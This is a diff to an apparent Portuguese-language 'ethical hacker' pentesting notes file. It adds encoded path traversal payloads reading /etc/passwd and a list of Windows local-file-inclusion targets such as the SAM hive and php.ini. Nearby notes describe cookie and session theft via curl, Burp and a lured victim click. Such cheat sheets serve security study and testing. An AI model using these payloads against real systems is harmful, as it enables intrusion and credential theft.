@@ -17,12 +17,15 @@ Encontre aqui notas e comandos de um HACKER ÉTICO
 
 .
 
-	/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
+	/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd%00
 
 .
 
 	/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
  
+.
+
+	%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 .
 
 	/../../../../../../../../../../etc/passwd
@@ -3851,6 +3854,27 @@ Exemplos abaixo:
 
         http://192.168.1.10/turismo/info.php?p=/../../../../
 
+LFI - Windows List [FOR MORE](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e) [SOURCE](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/lfi-rfi)
+
+	C:\Windows\System32\drivers\etc\hosts
+	c:\WINDOWS\system32\eula.txt
+	c:\WINDOWS\system32\
+ 	c:\boot.ini  
+	c:\WINDOWS\win.ini  
+	c:\WINNT\win.ini  
+	c:\WINDOWS\Repair\SAM  
+	c:\WINDOWS\php.ini  
+	c:\WINNT\php.ini  
+	c:\Program Files\Apache Group\Apache\conf\httpd.conf  
+	c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
+	c:\Program Files\xampp\apache\conf\httpd.conf  
+	c:\php\php.ini  
+	c:\php5\php.ini  
+	c:\php4\php.ini  
+	c:\apache\php\php.ini  
+	c:\xampp\apache\bin\php.ini  
+	c:\home2\bin\stable\apache\php.ini  
+	c:\home\bin\stable\apache\php.ini
 
 - LFI -> RCE = Inserção de código no LOG
 
@@ -4222,7 +4246,7 @@ Ao fazer uso da ferramenta, caso haja algum login válido e tenha conseguido ace
 
 Quando houver um redirecionamento forçando o navegador ir para a página correta, pode-se usar o CURL passando a página desejada de modo que ele não redirecione, a menos que use o `-L`. Podendo fazer o roubo do cookie, para ganhar acesso. O cookie da sessão do usuário limitado pode ser usado no curl na flag `-c "cookie"` Para facilitar o encontro de páginas. Para usar o curl no BURP, `--proxy 127.0.0.1:8080` A requisição passará pelo burp podendo fazer o redirecionamento também. No burp, pode usar lá em options e marcar Intercept Client Requests e alterar o location para a pagina de acesso full. Para roubo de sessão, escutar em uma porta e mandar o link para o alvo, quando a vítima clicar o cookie dela será enviado para o atacante, desse modo podendo roubar a sessão da vítima.
 
-- File Disclosure - LFI
+- File Disclosure
 
 Acessar arquivos e fazer downloads do código fonte de páginas. Geralmente campos de upload, download e redirecionamento. Olhar o cookie e tentar decifrar e pedir outro arquivo, quando sem ideia, pode pedir o próprio arquivo de download.  No Host 192.200.0.20/sistema - troca o cookie para true e faz um download do conecta.php pegando os dados do mysql para acessar o banco, pegar a senha e acessar o ssh.
 
